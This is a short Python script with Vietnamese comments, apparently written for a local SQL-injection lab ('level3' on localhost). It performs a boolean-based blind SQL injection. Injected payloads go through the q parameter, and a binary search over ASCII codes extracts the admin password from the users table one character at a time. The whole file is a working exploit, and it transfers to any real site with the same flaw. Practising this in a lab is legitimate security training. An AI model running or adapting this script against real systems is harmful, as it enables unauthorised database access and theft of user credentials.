import requests
from urllib.parse import quote

# B1: Khai bao target
SUCCESS_INDICATOR = '✅ Find out 3 cakes match'  # THAY ĐỔI CÁI NÀY CHO ĐÚNG VỚI WEBSITE
URL_TARGET = 'http://localhost:26004/level3.php'
PASSWORD = []

charset = list(range(48, 58)) + list(range(97, 123))

# ham check bang
def checked_equal(start, char_mid):
    # gui request kiem tra
    PAYLOADS = f"hehe' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),{start},1)) = {char_mid}-- -"
    ENCODED_PAYLOADS = quote(PAYLOADS)

    FINAL_URL_TARGET = f"{URL_TARGET}?q={ENCODED_PAYLOADS}"

    r = requests.get(FINAL_URL_TARGET)  # ĐÃ SỬA LỖI Ở ĐÂY

    if SUCCESS_INDICATOR in r.text:
        return True #neu dung
    
    return False #neu sai

# Tao vong lap
# char gom so + ky tu
for start in range (1,30): #doan nay random do dai chuoi
    low = 0
    high = len(charset) - 1
    end = False
    while low <= high:
        #tinh mid
        mid = (low + high) // 2
        char_mid = charset[mid]

        # gui request so sanh lon hon
        PAYLOADS = f"hehe' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),{start},1)) > {char_mid}-- -"
        ENCODED_PAYLOADS = quote(PAYLOADS)

        FINAL_URL_TARGET = f"{URL_TARGET}?q={ENCODED_PAYLOADS}"
        
        r = requests.get(FINAL_URL_TARGET)
        
        # Kiem tra response xem co chua str 'Welcome back'
        if SUCCESS_INDICATOR in r.text:
            # lay canh tren
            low = mid + 1
        else:
            #kiem tra thu coi co bang khong
            found = checked_equal(start, char_mid)
            if found is True:
                end = True
                # tim thay ky tu
                ascii_char = chr(char_mid)
                PASSWORD.append(ascii_char)
                print("[FOUND] Tim thay pass roi ne ba: ", "".join(PASSWORD))
                break
            else:
                # lay canh duoi
                high = mid - 1

    if not end:
        break

print("[FINAL PASSWORD]:", "".join(PASSWORD))